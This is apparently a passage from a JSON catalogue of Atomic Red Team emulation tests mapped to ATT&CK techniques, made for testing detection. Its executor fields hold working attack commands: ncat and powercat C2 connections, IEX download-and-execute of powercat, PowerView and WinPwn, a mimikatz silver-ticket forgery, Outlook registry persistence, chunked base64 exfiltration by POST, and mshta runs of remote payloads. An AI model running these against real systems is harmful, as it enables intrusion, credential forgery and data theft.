				"description": "The folder path of ncat.exe",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1095"
			},
			"server_ip": {
				"description": "The IP address or domain name of the listening server",
				"type": "string",
				"default": "127.0.0.1"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "ncat.exe must be available at specified location (#{ncat_exe})\n",
				"prereq_command": "if( Test-Path \"#{ncat_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -ItemType Directory -Force -Path \"#{ncat_path}\" | Out-Null\n$parentpath = Split-Path (Split-Path \"#{ncat_exe}\"); $zippath = \"$parentpath\\nmap.zip\"\nInvoke-WebRequest  \"https://nmap.org/dist/nmap-7.80-win32.zip\" -OutFile \"$zippath\"\n  Expand-Archive $zippath $parentpath -Force\n  $unzipPath = Join-Path $parentPath \"nmap-7.80\"\nif( $null -eq (Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | ?{$_.DisplayName -like \"Microsoft Visual C++*\"}) ) {\n  Start-Process (Join-Path $unzipPath \"vcredist_x86.exe\")\n}\n"
			}
		],
		"executor": {
			"command": "cmd /c \"#{ncat_exe}\" #{server_ip} #{server_port}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1095",
		"phases": ["command-and-control"]
	},
	{
		"name": "Powercat C2",
		"auto_generated_guid": "3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"server_ip": {
				"description": "The IP address or domain name of the listening server",
				"type": "string",
				"default": "127.0.0.1"
			},
			"server_port": {
				"description": "The port for the C2 connection",
				"type": "integer",
				"default": 80
			}
		},
		"executor": {
			"command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c #{server_ip} -p #{server_port}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1095",
		"phases": ["command-and-control"]
	},
	{
		"name": "Crafting Active Directory silver tickets with mimikatz",
		"auto_generated_guid": "385e59aa-113e-4711-84d9-f637aef01f2c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"domain_sid": {
				"description": "SID of the targeted domain, if you keep default it will automatically get the current domain SID",
				"type": "string",
				"default": "S-1-5-21-DEFAULT"
			},
			"domain": {
				"description": "Targeted Active Directory domain FQDN",
				"type": "string",
				"default": "%userdnsdomain%"
			},
			"account": {
				"description": "Account to impersonate",
				"type": "string",
				"default": "silverticketfakeuser"
			},
			"target": {
				"description": "System you want to target (Default will be logon server)",
				"type": "string",
				"default": "%logonserver:\\\\=%"
			},
			"service_aes256_key": {
				"description": "AES256 key (you will need to set to match your service key for your target)",
				"type": "string",
				"default": "b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9"
			},
			"mimikatz_path": {
				"description": "Mimikatz windows executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
				"prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"#{domain_sid}\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to silver.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\silver.txt 2>&1 (\n  echo Purge existing tickets and create silver ticket:\n  klist purge\n  #{mimikatz_path} \"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{service_aes256_key} /user:#{account} /service:HOST /target:#{target}.#{domain} /ptt\" \"exit\"\n\n  echo.\n  echo executing:schtasks /query /S #{target}.#{domain}\n  schtasks /query /S #{target}.#{domain}\n  \n  echo.\n  echo Tickets after requesting schtasks:\n  klist\n\n  echo.\n  echo End of Silver Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Silver Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\silver.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore\n"
		},
		"attack_technique": "T1558.002",
		"phases": ["credential-access"]
	},
	{
		"name": "Install Outlook Home Page Persistence",
		"auto_generated_guid": "7a91ad51-e6d2-4d43-9471-f26362f5738e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"url": {
				"description": "URL to Outlook Home Page containing the payload to execute (can be local file:// or remote https://)",
				"type": "string",
				"default": "file://PathToAtomicsFolder\\T1137.004\\src\\T1137.004.html"
			},
			"outlook_version": {
				"description": "Version of Outlook that is installed",
				"type": "float",
				"default": 16.0
			},
			"outlook_folder": {
				"description": "Name of the Outlook folder to modify the homepage setting for",
				"type": "string",
				"default": "Inbox"
			}
		},
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "reg.exe add HKCU\\Software\\Microsoft\\Office\\#{outlook_version}\\Outlook\\WebView\\#{outlook_folder} /v URL /t REG_SZ /d #{url} /f\n",
			"cleanup_command": "reg.exe delete HKCU\\Software\\Microsoft\\Office\\#{outlook_version}\\Outlook\\WebView\\#{outlook_folder} /v URL /f >nul 2>&1\n"
		},
		"attack_technique": "T1137.004",
		"phases": ["persistence"]
	},
	{
		"name": "Data Transfer Size Limits",
		"auto_generated_guid": "ab936c51-10f4-46ce-9144-e02137b2016a",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"file_name": {
				"description": "File name",
				"type": "path",
				"default": "T1030_urandom"
			},
			"folder_path": {
				"description": "Path where the test creates artifacts",
				"type": "path",
				"default": "/tmp/T1030"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "The file must exist for the test to run.",
				"prereq_command": "if [ ! -f #{folder_path}/#{file_name} ]; then exit 1; else exit 0; fi;\n",
				"get_prereq_command": "if [ ! -d #{folder_path} ]; then mkdir -p #{folder_path}; touch #{folder_path}/safe_to_delete; fi; dd if=/dev/urandom of=#{folder_path}/#{file_name} bs=25000000 count=1\n"
			}
		],
		"executor": {
			"command": "cd #{folder_path}; split -b 5000000 #{file_name}\nls -l #{folder_path}\n",
			"cleanup_command": "if [ -f #{folder_path}/safe_to_delete ]; then rm -rf #{folder_path}; fi;\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1030",
		"phases": ["exfiltration"]
	},
	{
		"name": "Network-Based Data Transfer in Small Chunks",
		"auto_generated_guid": "f0287b58-f4bc-40f6-87eb-692e126e7f8f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"source_file_path": {
				"description": "Path to the source file to transfer.",
				"type": "path",
				"default": "[User specified]"
			},
			"destination_url": {
				"description": "URL of the destination server.",
				"type": "url",
				"default": "http://example.com"
			},
			"chunk_size": {
				"description": "Size of each data chunk (in KB).",
				"type": "integer",
				"default": 1024
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$file = [System.IO.File]::OpenRead(#{source_file_path})\n$chunkSize = #{chunk_size} * 1KB\n$buffer = New-Object Byte[] $chunkSize\n\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\n    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\n    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk\n}\n$file.Close()\n"
		},
		"attack_technique": "T1030",
		"phases": ["exfiltration"]
	},
	{
		"name": "Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject",
		"auto_generated_guid": "1483fab9-4f52-4217-a9ce-daa9d7747cae",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_url": {
				"description": "location of the payload",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct"
			}
		},
		"executor": {
			"command": "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Mshta executes VBScript to execute malicious command",
		"auto_generated_guid": "906865c3-e05f-4acc-85c4-fbc185455095",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Mshta Executes Remote HTML Application (HTA)",
		"auto_generated_guid": "c4b97eeb-5249-4455-a607-59f95485cb45",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"temp_file": {
				"description": "temp_file location for hta",
				"type": "string",
				"default": "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta"
			},
			"hta_url": {
				"description": "URL to HTA file for execution",
				"type": "string",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"
			}
		},
		"executor": {
			"command": "$var =Invoke-WebRequest \"#{hta_url}\"\n$var.content|out-file \"#{temp_file}\"\nmshta \"#{temp_file}\"\nstart-sleep -s 15\nstop-process -name \"calculator\" -Force\n",
			"cleanup_command": "remove-item \"#{temp_file}\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement",
		"auto_generated_guid": "007e5672-2088-4853-a562-7490ddc19447",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"script_engine": {
				"description": "Script Engine to use",
				"type": "string",
				"default": "JScript"
			},
			"hta_file_path": {
				"description": "HTA file name and or path to be used",
				"type": "string",
				"default": "Test.hta"
			},
			"mshta_file_path": {
				"description": "Location of mshta.exe",
				"type": "string",
				"default": "$env:windir\\system32\\mshta.exe"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Invoke HTML Application - Jscript Engine Simulating Double Click",
		"auto_generated_guid": "58a193ec-131b-404e-b1ca-b35cf0b18c33",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"script_engine": {
				"description": "Script Engine to use",
				"type": "string",
				"default": "JScript"
			},
			"hta_file_path": {
				"description": "HTA file name and or path to be used",
				"type": "string",
				"default": "Test.hta"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Invoke HTML Application - Direct download from URI",
		"auto_generated_guid": "39ceed55-f653-48ac-bd19-aceceaf525db",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"mshta_file_path": {
				"description": "Location of mshta.exe",
				"type": "string",
				"default": "$env:windir\\system32\\mshta.exe"
			},
			"hta_uri": {
				"description": "URI to HTA",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler",
		"auto_generated_guid": "e7e3a525-7612-4d68-a5d3-c4649181b8af",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"rundll32_file_path": {
				"description": "Location of rundll32.exe",
				"type": "path",
				"default": "$env:windir\\system32\\rundll32.exe"
			},
			"script_engine": {
				"description": "Script Engine to use",
				"type": "string",
				"default": "JScript"
			},
			"protocol_handler": {
				"description": "Protocol Handler to use",
				"type": "string",
				"default": "About"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Invoke HTML Application - JScript Engine with Inline Protocol Handler",
		"auto_generated_guid": "d3eaaf6a-cdb1-44a9-9ede-b6c337d0d840",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"mshta_file_path": {
				"description": "Location of mshta.exe",
				"type": "path",
				"default": "$env:windir\\system32\\mshta.exe"
			},
			"script_engine": {
				"description": "Script Engine to use",
				"type": "string",
				"default": "JScript"
			},
			"protocol_handler": {
				"description": "Protocol Handler to use",
				"type": "string",
				"default": "About"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Invoke HTML Application - Simulate Lateral Movement over UNC Path",
		"auto_generated_guid": "b8a8bdb2-7eae-490d-8251-d5e0295b2362",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"mshta_file_path": {
				"description": "Location of mshta.exe",
				"type": "string",
				"default": "$env:windir\\system32\\mshta.exe"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Mshta used to Execute PowerShell",
		"auto_generated_guid": "8707a805-2b76-4f32-b1c0-14e558205772",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"message": {
				"description": "Encoded message to include",
				"type": "string",
				"default": "Hello,%20MSHTA!"
			},
			"seconds_to_sleep": {
				"description": "How many seconds to sleep/wait",
				"type": "integer",
				"default": 5
			}
		},
		"executor": {
			"command": "mshta.exe \"about:<hta:application><script language=\"VBScript\">Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run%20\"\"powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}\"\"\"))</script>'\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Enable Windows Remote Management",
		"auto_generated_guid": "9059e8de-3d7d-4954-a322-46161880b9cf",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Enable-PSRemoting -Force\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1021.006",
		"phases": ["lateral-movement"]
	},
	{
		"name": "Remote Code Execution with PS Credentials Using Invoke-Command",
		"auto_generated_guid": "5295bd61-bd7e-4744-9d52-85962a4cf2d6",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Enable-PSRemoting -Force\nInvoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}",
			"cleanup_command": "Disable-PSRemoting -Force",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1021.006",
		"phases": ["lateral-movement"]
	},
	{
		"name": "WinRM Access with Evil-WinRM",
		"auto_generated_guid": "efe86d95-44c4-4509-ae42-7bfd9d1f5b3d",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"user_name": {
				"description": "Username",
				"type": "string",
				"default": "Domain\\Administrator"
			},
			"destination_address": {
				"description": "Remote Host IP or Hostname",
				"type": "string",
				"default": "Target"
			},
			"password": {
				"description": "Password",
				"type": "string",
				"default": "P@ssw0rd1"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Computer must have Ruby Installed",
				"prereq_command": "try {if (ruby -v) {exit 0} else {exit 1}} catch {exit 1}",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest  -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubyinstaller-2.7.1-1-x64.exe\" https://github.com/oneclick/rubyinstaller2/releases/download/RubyInstaller-2.7.1-1/rubyinstaller-2.7.1-1-x64.exe\n$file1= \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubyinstaller-2.7.1-1-x64.exe\"\nStart-Process $file1 /S;"
			},
			{
				"description": "Computer must have Evil-WinRM installed",
				"prereq_command": "try {if (evil-winrm -h) {exit 0} else {exit 1}} catch {exit 1}",
				"get_prereq_command": "gem install evil-winrm"
			}
		],
		"executor": {
			"command": "evil-winrm -i #{destination_address} -u #{user_name} -p #{password}",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1021.006",
		"phases": ["lateral-movement"]
	},
	{
		"name": "Display group policy information via gpresult",
		"auto_generated_guid": "0976990f-53b1-4d3f-a185-6df5be429d3b",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "gpresult /z\n"
		},
		"attack_technique": "T1615",
		"phases": ["discovery"]
	},
	{
		"name": "Get-DomainGPO to display group policy information via PowerView",
		"auto_generated_guid": "4e524c4e-0e02-49aa-8df5-93f3f7959b9f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1615",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - GPOAudit",
		"auto_generated_guid": "bc25c04b-841e-4965-855f-d1f645d7ab73",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPOAudit -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1615",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - GPORemoteAccessPolicy",
		"auto_generated_guid": "7230d01a-0a72-4bd5-9d7f-c6d472bc6a59",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPORemoteAccessPolicy -consoleoutput -noninteractive",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1615",
		"phases": ["discovery"]
	},
	{
		"name": "MSFT Get-GPO Cmdlet",
		"auto_generated_guid": "52778a8f-a10b-41a4-9eae-52ddb74072bf",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"gpo_output": {
				"description": "The output of the Get-GPO cmdlet",
				"type": "string",
				"default": "$env:temp\\GPO_Output.txt"
			},
			"gpo_param": {
				"description": "You can specify a GPO by its display name or by its globally unique identifier (GUID) to get a single GPO, or you can get all the GPOs in the domain through the All parameter",
				"type": "string",
				"default": "-All"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Add Rsat.ActiveDirectory.DS",
				"prereq_command": "if(Get-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 | Where-Object { $_.State -eq 'Installed' }){ exit 0 } else { exit 1 }",
				"get_prereq_command": "Add-WindowsCapability -online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
			},
			{
				"description": "Add Rsat.GroupPolicy.Management.Tools ###Two RSAT Modules needed for this to work on Win10, WinServer 2019 works by default. This will take a long time (almost 2 minutes) to install RSAT Manually###.",
				"prereq_command": "if(Get-WindowsCapability -Online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0 | Where-Object { $_.State -eq 'Installed' }){ exit 0 } else { exit 1 }",
				"get_prereq_command": "Add-WindowsCapability -online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0"
			}
		],
		"executor": {
			"command": "Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output}",
			"cleanup_command": "del $env:temp\\GPO_Output.txt -erroraction silentlycontinue",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1615",
		"phases": ["discovery"]
	},
	{
		"name": "Regasm Uninstall Method Call Test",
		"auto_generated_guid": "71bfbfac-60b1-4fc0-ac8b-2cedbbdcb112",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file": {
				"description": "Location of the payload",
				"type": "path",
				"default": "%tmp%\\T1218.009.dll"
			},
			"source_file": {
				"description": "Location of the CSharp source_file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.009\\src\\T1218.009.cs"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The CSharp source file must exist on disk at specified location (#{source_file})\n",
				"prereq_command": "if (Test-Path \"#{source_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{source_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs\" -OutFile \"#{source_file}\"\n"
			}
		],
		"executor": {
			"command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library \"#{source_file}\"\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U #{output_file}\n",
			"cleanup_command": "del #{output_file} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.009",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Regsvcs Uninstall Method Call Test",
		"auto_generated_guid": "fd3c1c6a-02d2-4b72-82d9-71c527abb126",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file": {
				"description": "Location of the payload",
				"type": "path",
				"default": "$Env:TEMP\\T1218.009.dll"
			},
			"source_file": {
				"description": "Location of the CSharp source_file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.009\\src\\T1218.009.cs"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The CSharp source file must exist on disk at specified location (#{source_file})\n",
				"prereq_command": "if (Test-Path \"#{source_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{source_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs\" -OutFile \"#{source_file}\"\n"
			}
		],
		"executor": {
